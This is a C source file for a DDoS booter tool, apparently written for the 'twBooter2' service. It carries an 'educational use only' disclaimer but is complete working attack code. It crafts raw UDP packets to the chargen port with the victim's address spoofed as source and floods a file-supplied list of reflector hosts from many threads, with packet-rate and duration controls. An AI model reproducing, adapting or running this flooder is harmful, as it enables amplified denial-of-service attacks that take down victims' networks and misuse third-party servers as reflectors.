/*
 * Developed exclusively for twBooter2
 * All credits go to LiteSpeed
 * For educational use only.
 * 
 * This is released under the GNU GPL License v3.0, and is not allowed to be used for commercial products
 */
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 8192
#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;
struct list
{
	struct sockaddr_in data;
	struct list *next;
	struct list *prev;
};
struct list *head;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
struct thread_data{ int thread_id; struct list *list_node; struct sockaddr_in sin; };

void init_rand(uint32_t x)
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++)
	{
		Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
	}
}

uint32_t rand_cmwc(void)
{
	uint64_t t, a = 18782LL;
	static uint32_t i = 4095;
	uint32_t x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c) {
		x++;
		c++;
	}
	return (Q[i] = r - x);
}

/* function for header checksums */
unsigned short csum (unsigned short *buf, int nwords)
{
	unsigned long sum;
	for (sum = 0; nwords > 0; nwords--)
	sum += *buf++;
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return (unsigned short)(~sum);
}

void setup_ip_header(struct iphdr *iph)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 1;
	iph->id = htonl(54321);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;
	iph->saddr = inet_addr("192.168.3.100");
}

void setup_udp_header(struct udphdr *udph)
{
	udph->source = htons(5678);
	udph->dest = htons(19);
	udph->check = 0;
	memset((void *)udph + sizeof(struct udphdr), 0x01, 1);
	udph->len=htons(sizeof(struct udphdr) + 1);
}

void *flood(void *par1)
{
	struct thread_data *td = (struct thread_data *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
	struct sockaddr_in sin = td->sin;
	struct  list *list_node = td->list_node;
	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if(s < 0){
		fprintf(stderr, "Could not open raw socket.\n");
		exit(-1);
	}
	init_rand(time(NULL));
	memset(datagram, 0, MAX_PACKET_SIZE);
	setup_ip_header(iph);
	setup_udp_header(udph);
	udph->source = htonl(((rand_cmwc() & 0xFFFF) % 50000) + 1024);
	iph->saddr = sin.sin_addr.s_addr;
	iph->daddr = list_node->data.sin_addr.s_addr;
	iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
	int tmp = 1;
	const int *val = &tmp;
	if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
		exit(-1);
	}
	
	init_rand(time(NULL));
	register unsigned int i;
	i = 0;
	register unsigned int z;
	z = 0;
	while(1){
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &list_node->data, sizeof(list_node->data));
		list_node = list_node->next;
		udph->source = htonl(((rand_cmwc() & 0xFFFF) % 50000) + 1024);
		iph->daddr = list_node->data.sin_addr.s_addr;
		iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
		iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
		
		if(z > 1000)
		{
			z = 0;
			sleep(5);
		}
		
		pps++;
		if(i >= limiter)
		{
			i = 0;
			usleep(sleeptime);
		}
		i++;
		z++;
	}
}
int main(int argc, char *argv[ ])
{
	if(argc < 5){
		fprintf(stderr, "Invalid parameters!\n");
		fprintf(stdout, "Usage: %s <target IP> <reflection file> <threads> <pps limiter, -1 for no limit> <time>\n", argv[0]);
		exit(-1);
	}
	int i = 0;
	head = NULL;
	fprintf(stdout, "Setting up Sockets...\n");
	int max_len = 128;
	char *buffer = (char *) malloc(max_len);
	buffer = memset(buffer, 0x00, max_len);
	int num_threads = atoi(argv[3]);
	int maxpps = atoi(argv[4]);
	limiter = 0;
	pps = 0;
	int multiplier = 20;
	
	FILE *list_fd = fopen(argv[2],  "r");
	while (fgets(buffer, max_len, list_fd) != NULL) {
		if ((buffer[strlen(buffer) - 1] == '\n') ||
				(buffer[strlen(buffer) - 1] == '\r')) {
			buffer[strlen(buffer) - 1] = 0x00;
			if(head == NULL)
			{
				head = (struct list *)malloc(sizeof(struct list));
				bzero(&head->data, sizeof(head->data));
				head->data.sin_addr.s_addr=inet_addr(buffer);
				head->next = head;
				head->prev = head;
			} else {
				struct list *new_node = (struct list *)malloc(sizeof(struct list));
				memset(new_node, 0x00, sizeof(struct list));
				new_node->data.sin_addr.s_addr=inet_addr(buffer);
				new_node->prev = head;
				new_node->next = head->next;
				head->next = new_node;
			}
			i++;
		} else {
			continue;
		}
	}
	struct list *current = head->next;
	pthread_t thread[num_threads];
	struct sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(1025);
	sin.sin_addr.s_addr = inet_addr(argv[1]);
	struct thread_data td[num_threads];
	for(i = 0;i<num_threads;i++){
		td[i].thread_id = i;
		td[i].sin= sin;
		td[i].list_node = current;
		pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
	}
	fprintf(stdout, "Starting Flood...\n");
	for(i = 0;i<(atoi(argv[5])*multiplier);i++)
	{
		usleep((1000/multiplier)*1000);
		if((pps*multiplier) > maxpps)
		{
			if(1 > limiter)
			{
				sleeptime+=100;
			} else {
				limiter--;
			}
		} else {
			limiter++;
			if(sleeptime > 25)
			{
				sleeptime-=25;
			} else {
				sleeptime = 0;
			}
		}
		pps = 0;
	}
	return 0;
}